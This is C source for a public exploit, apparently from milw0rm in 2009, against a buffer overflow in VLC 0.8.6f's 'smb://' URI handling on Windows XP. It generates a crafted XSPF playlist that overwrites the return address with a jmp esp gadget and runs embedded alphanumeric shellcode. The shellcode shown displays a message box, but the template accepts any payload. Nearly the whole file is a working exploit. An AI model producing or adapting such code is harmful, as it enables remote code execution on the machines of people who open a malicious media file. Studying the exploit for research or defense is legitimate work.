/*  VLC Media Player 'smb://' URI Handling Remote Buffer Overflow Vulnerability Exploit
 *  Reference: http://www.securityfocus.com/bid/35500
 *
 *  Tested on VLC media player 0.8.6f on WinXP SP3
 *   
 *  Coded by Pankaj Kohli
 *  http://www.pank4j.com
 *
 */
 
#include <stdio.h>
#include <string.h>
 
// ASCII shellcode (Display a message box & exit)
unsigned char shell[] = "TY777777777777777777777777777777777QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIXkweaHrJwpf02pQzePMhyzWwSuQnioXPOHuBxKnaQlkOjpJHIvKOYokObPPwRN1uqt5PA";
 
long jmp = 0x7E485233;  // jmp esp (user32.dll)
 
int main(int argc, char **argv) {
    char buff[512], *p;
    FILE *fp;
    int i;
    long *ptr;
 
    fp = fopen("sploit.xspf", "wb");
    fprintf(fp, "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
    fprintf(fp, "<playlist version=\"1\" xmlns=\"http://xspf.org/ns/0/\" xmlns:vlc=\"http://www.videolan.org/vlc/playlist/ns/0/\">\n");
    fprintf(fp, "\t<title>Playlist</title>\n");
    fprintf(fp, "\t<trackList>\n");
    fprintf(fp, "\t\t<track>\n");
    fprintf(fp, "\t\t\t<location>smb://example.com@www.example.com/foo/#{");
    
    printf("[*] Creating buffer\n");
    for(i=0; i<300; i++) {
        buff[i] = 'a' + ((i/4)%26);
    }
    ptr = (long *) (buff + 96);
    *ptr = jmp;
    for(i=0; i<strlen((const char *) shell); i++) {
        buff[i+100] = shell[i];
    }
    buff[300] = 0;
    fprintf(fp, "%s", buff);
    
    fprintf(fp, "}</location>\n");
    fprintf(fp, "\t\t\t<extension application=\"http://www.videolan.org/vlc/playlist/0\">\n");
    fprintf(fp, "\t\t\t\t<vlc:id>0</vlc:id>\n");
    fprintf(fp, "\t\t\t</extension>\n");
    fprintf(fp, "\t\t</track>\n");
    fprintf(fp, "\t</trackList>\n");
    fprintf(fp, "</playlist>\n");
    fclose(fp);
     
    printf("[*] Exploit file written to sploit.xspf\n");
     
    return 0;
}

// milw0rm.com [2009-07-30]
